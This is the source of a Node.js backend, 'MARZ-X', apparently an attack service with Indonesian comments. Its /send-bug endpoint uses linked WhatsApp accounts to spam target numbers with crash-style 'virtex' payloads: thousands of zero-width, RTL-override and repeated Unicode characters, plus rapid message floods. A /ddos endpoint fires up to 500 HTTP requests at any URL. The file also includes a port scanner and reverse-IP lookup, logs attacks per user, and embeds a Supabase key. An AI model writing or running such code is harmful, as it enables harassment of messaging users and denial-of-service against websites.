const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');
const { createClient } = require('@supabase/supabase-js');
const { Boom } = require('@hapi/boom');
const axios = require('axios');
const net = require('net');
const dns = require('dns');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());

// ============================================================
// KONFIGURASI SUPABASE
// ============================================================
const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ============================================================
// SESSIONS PER USER
// ============================================================
const sessions = {};
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// FUNGSI WHATSAPP SOCKET (PER USER)
// ============================================================
async function getUserSocket(username, phoneNumber) {
    if (sessions[username] && sessions[username].isReady) {
        return sessions[username].sock;
    }

    const authFolder = path.join(__dirname, `auth_${username}`);
    if (!fs.existsSync(authFolder)) {
        fs.mkdirSync(authFolder, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(authFolder);
    const sock = makeWASocket({
        printQRInTerminal: false,
        auth: state,
        browser: ['MARZ-X Bot', 'Chrome', '1.0.0']
    });

    const store = makeInMemoryStore({});
    store.bind(sock.ev);

    let pairingCode = null;
    let qrString = null;
    let isReady = false;

    setTimeout(async () => {
        if (!sock.authState.creds.registered) {
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                pairingCode = code;
                console.log(`[PAIRING] ${username} -> ${code}`);
            } catch (err) {
                console.error(`[ERROR] Pairing ${username}:`, err.message);
            }
        }
    }, 2000);

    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            qrString = qr;
            console.log(`[QR] ${username} tersedia`);
        }
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log(`[RECONNECT] ${username}...`);
                getUserSocket(username, phoneNumber);
            } else {
                console.log(`[LOGOUT] ${username}`);
                isReady = false;
                delete sessions[username];
            }
        } else if (connection === 'open') {
            console.log(`[READY] ${username} siap!`);
            isReady = true;
            pairingCode = null;
            qrString = null;
        }
    });

    sessions[username] = {
        sock: sock,
        isReady: isReady,
        pairingCode: pairingCode,
        qrString: qrString,
        phoneNumber: phoneNumber
    };

    const interval = setInterval(() => {
        if (sessions[username]) {
            sessions[username].isReady = isReady;
            sessions[username].pairingCode = pairingCode;
            sessions[username].qrString = qrString;
        } else {
            clearInterval(interval);
        }
    }, 1000);

    return sock;
}

// ============================================================
// FUNGSI UPDATE STATISTIK SUPABASE
// ============================================================
async function updateUserStats(username, type, target, detail) {
    if (!username) return;
    try {
        const { data: stats } = await supabase
            .from('users_stats')
            .select('bug_count, tool_count')
            .eq('username', username)
            .single();

        let bugCount = stats?.bug_count || 0;
        let toolCount = stats?.tool_count || 0;
        if (type === 'BUG') bugCount += 1;
        else if (type === 'TOOL') toolCount += 1;

        await supabase
            .from('users_stats')
            .upsert({
                username: username,
                bug_count: bugCount,
                tool_count: toolCount,
                updated_at: new Date().toISOString()
            }, { onConflict: 'username' });

        await supabase
            .from('activity_logs')
            .insert({
                username: username,
                type: type,
                detail: `${detail}\nTarget: ${target}\nJam: ${new Date().toLocaleString('id-ID', { hour12: false })}`,
                status: 'DONE',
                timestamp: new Date().toISOString()
            });

    } catch (err) {
        console.error('[ERROR] Supabase:', err);
    }
}

// ============================================================
// 1. ENDPOINT WHATSAPP BUG
// ============================================================
app.post('/pairing-code', async (req, res) => {
    const { username, phoneNumber } = req.body;
    if (!username || !phoneNumber) {
        return res.status(400).json({ error: 'username dan phoneNumber wajib diisi' });
    }
    if (sessions[username] && sessions[username].isReady) {
        return res.json({ status: 'ready', message: 'Sudah terhubung', code: null });
    }
    await getUserSocket(username, phoneNumber);
    let attempts = 0;
    while (attempts < 15) {
        const session = sessions[username];
        if (session && session.pairingCode) {
            return res.json({
                status: 'disconnected',
                message: 'Masukkan kode 8 digit ke WhatsApp > Perangkat Tertaut > Tautkan Perangkat dengan Nomor Telepon',
                code: session.pairingCode,
                expiresIn: '60 detik'
            });
        }
        await delay(500);
        attempts++;
    }
    return res.json({
        status: 'disconnected',
        message: 'Gagal generate kode. Coba ulangi.',
        code: null
    });
});

app.get('/qr/:username', async (req, res) => {
    const { username } = req.params;
    const session = sessions[username];
    if (!session) return res.status(404).json({ error: 'User belum terdaftar' });
    if (session.isReady) return res.status(400).json({ error: 'Sudah terhubung' });
    if (!session.qrString) return res.status(404).json({ error: 'QR belum tersedia' });
    try {
        const qrBuffer = await QRCode.toBuffer(session.qrString, { type: 'png', width: 300, margin: 2 });
        res.setHeader('Content-Type', 'image/png');
        res.send(qrBuffer);
    } catch (err) {
        res.status(500).json({ error: 'Gagal generate QR' });
    }
});

app.get('/status/:username', (req, res) => {
    const { username } = req.params;
    const session = sessions[username];
    if (!session) return res.json({ status: 'not_found', message: 'Belum register' });
    res.json({
        status: session.isReady ? 'ready' : 'disconnected',
        message: session.isReady ? 'Siap digunakan' : 'Belum pairing',
        phoneNumber: session.phoneNumber,
        pairingCode: session.pairingCode,
        qrAvailable: !!session.qrString
    });
});

app.post('/send-bug', async (req, res) => {
    const { targetNumber, effect, username, count = 0 } = req.body;
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
    const session = sessions[username];
    if (!session || !session.isReady || !session.sock) {
        return res.status(503).json({ error: `User ${username} belum terhubung.` });
    }
    if (!targetNumber) return res.status(400).json({ error: 'Nomor target wajib diisi' });

    const sock = session.sock;
    const chatId = targetNumber.includes('@s.whatsapp.net') ? targetNumber : `${targetNumber}@s.whatsapp.net`;
    console.log(`[BUG] ${username}: ${effect} -> ${targetNumber}`);

    try {
        const send = async (text) => await sock.sendMessage(chatId, { text });
        if (effect === 'DELAY HARD') {
            const total = count || 25;
            for (let i = 0; i < total; i++) {
                await send(`[DELAY] ${i+1}/${total}`);
                await delay(Math.floor(Math.random() * 700) + 200);
            }
        } else if (effect === 'BLANK HARD') {
            await send('\u200B'.repeat(3000));
            await send('‎‏‎‏‎‏‎‏‎‏‎‏‎‏'.repeat(200));
        } else if (effect === 'FREEZE HARD') {
            const total = count || 60;
            for (let i = 0; i < total; i++) {
                await send('.');
                await delay(15);
            }
        } else if (effect === 'FC INSTANT') {
            await send('*_~teks rusak~_*' + ' '.repeat(300) + '*bold tidak tutup');
            await send('```bash\n$ echo "hack"\n```' + '\n'.repeat(150) + '```');
            await send('‎‏‎‏‎‏'.repeat(300));
            await send('ဪ'.repeat(2000));
        } else if (effect === 'RESTART HARD') {
            const total = count || 10;
            for (let i = 0; i < total; i++) {
                await send(`[FILE] dummy ${i+1}/${total}`);
                await delay(80);
            }
        } else if (effect === 'BOOTLOOP HARD') {
            for (let i = 0; i < 30; i++) {
                await send('[LOOP] ' + '\u200B'.repeat(300));
                await delay(50);
            }
        } else if (effect === 'NUKE') {
            for (let i = 0; i < 20; i++) {
                await send('[NUKE] ' + '#'.repeat(40));
                await delay(60);
            }
            await send('\u200B'.repeat(4000));
            for (let i = 0; i < 50; i++) {
                await send('.');
                await delay(10);
            }
            await send('*_~rusak~_*' + ' '.repeat(200) + '*');
        } else if (effect === 'VIRTEX_LEGACY') {
            await send('\u202E' + 'SERANGAN BALIK' + '\u202D');
            await send('ဪ'.repeat(3000));
            await send('‍'.repeat(2000));
            await send('X'.repeat(5000));
        } else if (effect === 'FILE_BOMB') {
            const total = count || 25;
            for (let i = 0; i < total; i++) {
                await send(`[BOMB] ${i+1}/${total}`);
                await delay(30);
            }
        } else {
            return res.status(400).json({ error: `Efek "${effect}" tidak dikenal` });
        }

        await updateUserStats(username, 'BUG', targetNumber, `Efek: ${effect}`);
        res.json({ success: true, effect, target: targetNumber, message: `✅ Efek "${effect}" terkirim ke ${targetNumber}` });

    } catch (error) {
        console.error('[ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal kirim bug' });
    }
});

// ============================================================
// 2. DDOS – HTTP FLOOD
// ============================================================
app.post('/ddos', async (req, res) => {
    const { url, username, count = 100, method = 'GET' } = req.body;
    if (!url) return res.status(400).json({ error: 'URL target wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    console.log(`[DDOS] ${username} -> ${url} (${count} request)`);

    try {
        const promises = [];
        let success = 0, failed = 0;
        const start = Date.now();
        const maxReq = Math.min(count, 500);

        for (let i = 0; i < maxReq; i++) {
            const p = axios({
                method: method,
                url: url,
                timeout: 5000,
                validateStatus: () => true
            }).then(() => success++).catch(() => failed++);
            promises.push(p);
            if (i % 50 === 0) await delay(10);
        }

        await Promise.all(promises);
        const duration = ((Date.now() - start) / 1000).toFixed(2);

        await updateUserStats(username, 'TOOL', url, `DDoS HTTP (${method}) - ${success} sukses, ${failed} gagal`);

        res.json({
            success: true,
            target: url,
            total: maxReq,
            success,
            failed,
            duration: `${duration} detik`,
            message: `✅ DDoS selesai. ${success} berhasil, ${failed} gagal.`
        });

    } catch (error) {
        console.error('[DDOS ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal menjalankan DDoS' });
    }
});

// ============================================================
// 3. TOOL – PORT SCANNER
// ============================================================
app.post('/tools/portscan', async (req, res) => {
    const { host, username, ports } = req.body;
    if (!host) return res.status(400).json({ error: 'Host wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    const portList = ports ? ports.split(',').map(p => parseInt(p.trim())) : [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017];
    console.log(`[PORTSCAN] ${username} -> ${host} (${portList.length} ports)`);

    try {
        const results = [];
        const timeout = 2000;

        for (const port of portList) {
            const start = Date.now();
            const result = await new Promise((resolve) => {
                const socket = new net.Socket();
                const timer = setTimeout(() => {
                    socket.destroy();
                    resolve({ port, status: 'closed', time: Date.now() - start });
                }, timeout);
                socket.on('connect', () => {
                    clearTimeout(timer);
                    socket.destroy();
                    resolve({ port, status: 'open', time: Date.now() - start });
                });
                socket.on('error', () => {
                    clearTimeout(timer);
                    resolve({ port, status: 'filtered', time: Date.now() - start });
                });
                socket.connect(port, host);
            });
            results.push(result);
        }

        const openPorts = results.filter(r => r.status === 'open');
        const summary = `Host: ${host}, Open: ${openPorts.length}, Total: ${results.length}`;

        await updateUserStats(username, 'TOOL', host, `Port Scan: ${summary}`);

        res.json({
            success: true,
            host,
            results: results,
            openPorts: openPorts.map(r => r.port),
            summary,
            message: `✅ Port scan selesai. ${openPorts.length} port terbuka.`
        });

    } catch (error) {
        console.error('[PORTSCAN ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal scan port' });
    }
});

// ============================================================
// 4. TOOL – REVERSE IP
// ============================================================
app.post('/tools/reverseip', async (req, res) => {
    const { ip, username } = req.body;
    if (!ip) return res.status(400).json({ error: 'IP wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    try {
        const domain = await new Promise((resolve, reject) => {
            dns.reverse(ip, (err, hostnames) => {
                if (err) reject(err);
                else resolve(hostnames);
            });
        });

        await updateUserStats(username, 'TOOL', ip, `Reverse IP: ${domain.join(', ')}`);

        res.json({
            success: true,
            ip: ip,
            domain: domain,
            message: `✅ Reverse IP berhasil: ${domain.join(', ')}`
        });

    } catch (error) {
        console.error('[REVERSE IP ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal reverse IP' });
    }
});

// ============================================================
// ENDPOINT ROOT – RAPI DAN VALID
// ============================================================
app.get('/', (req, res) => {
    res.json({
        name: 'MARZ-X Backend',
        version: '2.1.0',
        status: 'online',
        endpoints: {
            whatsapp: {
                pairing: 'POST /pairing-code {username, phoneNumber}',
                qr: 'GET /qr/:username',
                status: 'GET /status/:username',
                sendBug: 'POST /send-bug {username, targetNumber, effect}'
            },
            ddos: {
                httpFlood: 'POST /ddos {username, url, count, method}'
            },
            tools: {
                portScan: 'POST /tools/portscan {username, host, ports}',
                reverseIp: 'POST /tools/reverseip {username, ip}'
            }
        }
    });
});

// ============================================================
// JALANKAN SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[SERVER] MARZ-X Backend running on port ${PORT}`);
    console.log(`[ENDPOINT] POST /send-bug       -> WhatsApp Bug`);
    console.log(`[ENDPOINT] POST /ddos            -> HTTP Flood DDoS`);
    console.log(`[ENDPOINT] POST /tools/portscan  -> Port Scanner`);
    console.log(`[ENDPOINT] POST /tools/reverseip -> Reverse IP`);
});
